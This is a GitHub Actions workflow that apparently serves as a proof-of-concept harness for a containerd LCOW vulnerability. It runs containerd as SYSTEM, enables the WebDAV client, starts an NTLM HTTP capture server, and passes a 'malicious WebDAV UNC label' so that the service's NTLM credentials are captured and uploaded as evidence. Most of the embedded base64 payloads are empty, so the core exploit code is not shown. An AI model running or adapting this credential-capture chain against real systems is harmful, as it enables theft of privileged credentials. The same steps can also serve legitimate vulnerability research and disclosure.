name: D17 LCOW WebDAV NTLM capture
on:
  workflow_dispatch:

jobs:
  webdav:
    runs-on: windows-latest
    timeout-minutes: 30
    steps:
      - name: Setup - containerd, harness, stub, impacket, NTLM HTTP server
        shell: pwsh
        run: |
          $ErrorActionPreference = 'Stop'
          $base = 'C:\ctdpoc'
          New-Item -ItemType Directory -Force -Path "$base\bin","$base\root","$base\state","$base\canary","$base\go","$base\stub","$base\share" | Out-Null
          Invoke-WebRequest -Uri 'https://github.com/containerd/containerd/releases/download/v2.4.2/containerd-2.4.2-windows-amd64.tar.gz' -OutFile "$base\ctd.tar.gz" -UseBasicParsing
          tar xzf "$base\ctd.tar.gz" -C "$base\bin"
          $cfg=''; [IO.File]::WriteAllBytes("$base\config.toml",[Convert]::FromBase64String($cfg))
          $gm='bW9kdWxlIGQxN3BvYwoKZ28gMS4yNAoKcmVxdWlyZSBnaXRodWIuY29tL2NvbnRhaW5lcmQvY29udGFpbmVyZC92MiB2Mi40LjIK'; [IO.File]::WriteAllBytes("$base\go\go.mod",[Convert]::FromBase64String($gm))
          $mn=''; [IO.File]::WriteAllBytes("$base\go\main.go",[Convert]::FromBase64String($mn))
          $st=''; [IO.File]::WriteAllBytes("$base\stub\main.go",[Convert]::FromBase64String($st))
          $sv=''; [IO.File]::WriteAllBytes("$base\ntlm_http_server.py",[Convert]::FromBase64String($sv))
          Set-Content "$base\stub\go.mod" -Value "module stub`n`ngo 1.24" -Encoding ascii
          $env:GO111MODULE='on'
          Set-Location "$base\go"; go mod tidy 2>&1 | Out-Null; go build -o "$base\poc.exe" . 2>&1 | Out-Null
          Write-Output "BUILD_POC_EXIT=$LASTEXITCODE"
          Set-Location "$base\stub"; go build -o "$base\bin\bin\runhcs.exe" . 2>&1 | Out-Null
          Write-Output "BUILD_STUB_EXIT=$LASTEXITCODE"
          python -m pip install --quiet impacket 2>&1 | Select-Object -Last 3
          Write-Output "PIP_EXIT=$LASTEXITCODE"

      - name: WebClient + NTLM HTTP server + containerd(SYSTEM) + trigger
        shell: pwsh
        run: |
          $ErrorActionPreference='Continue'
          $base='C:\ctdpoc'
          # WebClient service (WebDAV redirector)
          Write-Output '=== WebClient service ==='
          Get-Service WebClient -ErrorAction SilentlyContinue | Select-Object Name,Status,StartType | Format-Table
          Set-Service WebClient -StartupType Automatic -ErrorAction SilentlyContinue
          Start-Service WebClient -ErrorAction SilentlyContinue
          Get-Service WebClient -ErrorAction SilentlyContinue | Select-Object Name,Status | Format-Table
          # NTLM HTTP capture server on 8080
          $pSrv = Start-Process -FilePath "python" -ArgumentList @("$base\ntlm_http_server.py") -RedirectStandardOutput "$base\srv_stdout.log" -RedirectStandardError "$base\srv_stderr.log" -PassThru
          Write-Output "HTTP_SRV_PID=$($pSrv.Id)"
          Start-Sleep -Seconds 4
          # containerd AS SYSTEM
          $act = New-ScheduledTaskAction -Execute 'cmd.exe' -Argument "/c `"$base\bin\bin\containerd.exe --config $base\config.toml --log-level debug > $base\stdout.log 2> $base\stderr.log`""
          $prin = New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest
          $task = New-ScheduledTask -Action $act -Principal $prin
          Register-ScheduledTask -TaskName 'ctdpoc-daemon' -InputObject $task -Force | Out-Null
          Start-ScheduledTask -TaskName 'ctdpoc-daemon'
          Start-Sleep -Seconds 10
          Get-Process containerd -ErrorAction SilentlyContinue | Select-Object Id,ProcessName | Format-Table
          & "$base\bin\bin\ctr.exe" --address '\\.\pipe\ctd-grpc' plugins ls 2>&1 | Select-String 'windows-lcow'
          $unc = '\\127.0.0.1@8080\SHARE'
          Write-Output "=== malicious WebDAV UNC label: $unc ==="
          & "$base\poc.exe" '\\.\pipe\ctd-grpc' 'd17poc' 'windows-lcow' 'victim-webdav' 'containerd.io/snapshot/io.microsoft.container.storage.rootfs.location' $unc 2>&1 | Tee-Object -FilePath "$base\prepare_webdav.out"
          Write-Output "POC_EXIT=$LASTEXITCODE"
          Start-Sleep -Seconds 5
          Write-Output '=== NTLM HTTP capture log ==='
          if (Test-Path "$base\ntlm_http.log") { Get-Content "$base\ntlm_http.log" -Tail 40 } else { Write-Output 'NO LOG' }
          Write-Output '=== server stderr ==='
          if (Test-Path "$base\srv_stderr.log") { Get-Content "$base\srv_stderr.log" -Tail 20 }
          Write-Output '=== daemon log tail ==='
          if (Test-Path "$base\stderr.log") { Get-Content "$base\stderr.log" -Tail 15 }

      - name: Upload evidence
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: ctd-webdav-evidence
          path: |
            C:\ctdpoc\ntlm_http.log
            C:\ctdpoc\srv_stderr.log
            C:\ctdpoc\srv_stdout.log
            C:\ctdpoc\prepare_webdav.out
            C:\ctdpoc\stderr.log
            C:\ctdpoc\stdout.log
            C:\ctdpoc\config.toml
          if-no-files-found: warn
